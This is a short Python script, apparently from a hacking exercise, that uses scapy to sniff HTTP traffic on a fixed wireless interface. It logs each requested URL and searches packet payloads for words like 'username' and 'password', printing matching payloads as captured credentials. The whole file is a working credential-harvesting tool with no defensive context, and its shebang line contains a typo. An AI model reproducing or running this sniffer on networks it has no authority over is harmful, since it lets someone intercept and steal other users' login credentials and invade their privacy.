#!/usr/bim/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
	scapy.sniff(iface=interface, store=False, 
		prn=process_sniffed_packet)

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 
		print("[+] HTTP Request >> " + str(url))
		if packet.haslayer(scapy.Raw):
			load = str(packet[scapy.Raw].load)
			keywords = ["username", "user", "login", "password", "pass"]
			for keyword in keywords:
				if keyword in load:
					print("\n\n[+] Possible username/password > " 
						+ load + "\n\n")
					break
		

sniff("wlp3s0")
